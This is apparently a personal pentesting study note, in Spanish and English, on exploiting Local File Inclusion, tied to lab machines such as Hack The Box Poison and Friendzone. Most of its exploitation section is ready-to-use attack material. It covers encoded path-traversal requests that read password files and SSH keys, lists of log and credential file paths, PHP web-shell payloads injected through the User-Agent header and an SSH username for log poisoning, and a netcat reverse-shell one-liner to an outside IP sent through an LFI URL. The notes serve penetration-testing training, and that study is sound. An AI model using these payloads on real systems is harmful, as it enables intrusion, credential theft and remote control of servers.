## DESCRIPTION

**Local File Inclusion (LFI):** The sever loads a local file.

Diferencias entre LFI y Directory Path traversal: el LFI no solo lee sino también ejecuta en el servidor.

Before we examine _Local File Inclusion_ (LFI), let's take a moment to explore the differences between File Inclusion and Directory Traversal. These two concepts often get mixed up by penetration testers and security professionals. If we confuse the type of vulnerability we find, we may miss an opportunity to obtain code execution.

As covered in the last Learning Unit, we can use directory traversal vulnerabilities to obtain the contents of a file outside of the web server's web root. _File inclusion_ vulnerabilities allow us to "include" a file in the application's running code. This means we can use file inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file. Since we can include files in the application's running code with file inclusion vulnerabilities, we can also display the file contents of non-executable files. For example, if we leverage a directory traversal vulnerability in a PHP web application and specify the file **admin.php**, the source code of the PHP file will be displayed. On the other hand, when dealing with a file inclusion vulnerability, the **admin.php** file will be executed instead

#### Mas información
* https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers-and-protocols
* https://0xdf.gitlab.io/2018/09/08/htb-poison.html#reverse-shell

## EXPLOITATION

**!!NOTA IMPORTANTE!!** Para que en algunos casos no recorte la URL con curl se pueede usar el parámetro  `curl --path-as-is` 


**!!NOTA IMPORTANTE!!** Aplicar URL encoding en los ../:
* *`curl http://192.168.122.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords` 
* ` http://192.168.166.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/authorized_keys`
Mas filtros: https://book.hacktricks.xyz/pentesting-web/file-inclusion#basic-lfi-and-bypasses

### OPTION 1: LOG POISONING

If the web is vulnerbale to LFI, then we can try to exploit “Log Poisoning”. Basically it is to put a Reverse Shell and visualize it on the web through the logs of some service (usually APACHE or SSH).

1. Probamos a ver si podemos acceder a algun fichero de logs. Ficheros interesantes de LFI -> https://ed4m4s.blog/tools/local-file-inclusion

* Algunos de los interesantes en LINUX pueden ser:

```
RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – /var/log/httpd/access_log
FreeBSD Apache access log file location – /var/log/httpd-access.log
Debian / Ubuntu Linux Apache access log file location – /var/log/apache2/access.log

SSH LOG /var/log/auth.log
```

* Algunos de los interesantes en LINUX pueden ser:

```
# XAMPP
C:/xampp/apache/conf/httpd.conf
C:/xampp/security/webdav.htpasswd
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/xampp/tomcat/conf/web.xml
C:/xampp/tomcat/conf/tomcat-users.xml
C:/xampp/webalizer/webalizer.conf
C:/xampp/webalizer/webdav.txt
C:/xampp/apache/bin/php.ini
C:/xampp/apache/conf/httpd.conf
```

2. Ejecución de comandos: APACHE LOG: Añadimos en el User-Agent

```
<?php system($_GET['cmd']); ?>  →  Check usisng http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=ls (Its important to use ‘&’ if ‘?’ is alredy in used)
```

![[Pasted image 20230320170339.png]]

Ejemplo xampp Windows `http://192.168.227.53:8080/site/index.php?page=../../../../../../..//xampp/apache/logs/access.log&cmd=dir`

![[Pasted image 20230320170023.png]]

3. Creamos una reverse shell [[REVERSE SHELLS]]y la tranferimos [[TRANSFERRING FILES]]
-------------------------------------------------------------------------
4. SSH LOG:

```
 ssh '<?php system($_GET['cmd']); ?>'@10.10.10.84 
```

5. Creamos una reverse shell [[REVERSE SHELLS]]y la tranferimos [[TRANSFERRING FILES]]

### OPTION 2: LFI + SMB
1. Encontramos un LFI

2. Subimos la shell usando SMB o cualquier forma de subida (ftp, etc) y la llamamos desde la URL

![[Pasted image 20230320170718.png]]

![[Pasted image 20230320170724.png]]


3. En linuz podemos intentar ejecutar del tiron esta shell interactiva con netcat

```
https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/0xdf&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.7 443 >/tmp/f
```


### OPTION 3: ENCONTRAR CLAVES PRIVADA SSH

1. Puedes buscar el fichero `authorized_keys`

```
http://192.168.166.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/authorized_keys
```

2. Busca la clave correspondiente: id_rsa, id_ecdsa, etc
![[Pasted image 20230425121925.png]]

3. [[SSH (22)]]
## MACHINES

* Hack The Box: Poison, Friendzone
* PG Practice: Slort

